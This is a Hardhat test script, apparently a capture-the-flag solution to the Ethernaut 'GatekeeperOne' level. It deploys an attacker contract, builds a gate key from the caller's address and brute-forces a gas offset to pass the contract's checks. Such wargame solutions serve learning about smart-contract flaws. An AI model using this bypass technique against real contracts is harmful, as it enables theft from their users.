import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`GatekeeperOne`);
  const challengeAddress = await createChallenge(
    `0x9b261b23cE149422DE75907C6ac0C30cEc4e652A`
  );
  challenge = await challengeFactory.attach(challengeAddress);

  const attackerFactory = await ethers.getContractFactory(`GatekeeperOneAttacker`);
  attacker = await attackerFactory.deploy(challenge.address);
});

it("solves the challenge", async function () {
  // const gateKey = `0x1122334455667788`
  const address = await eoa.getAddress()
  const uint16TxOrigin = address.slice(-4)
  const gateKey = `0x100000000000${uint16TxOrigin}`
  console.log(`gateKey = ${gateKey}`)
  // _gateKey = 0x1122334455667788
  // uint32(uint64(_gateKey)) 0x55667788 = 1432778632
  // uint64(_gateKey) 0x1122334455667788 = 1234605616436508552
  // uint16(tx.origin) 0xD74C = 55116
  // tx.orign = 0x48490375809Cf5Af9D635C7860BD7F83f9f2D74c

  // use this to bruteforce gas usage
  const MOD = 8191
  const gasToUse = 800000
  for(let i = 0; i < MOD; i++) {
    console.log(`testing ${gasToUse + i}`)
    try {
      tx = await attacker.attack(gateKey, gasToUse + i, {
        gasLimit: `950000`
      });
      break;
    } catch {}
  }

});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
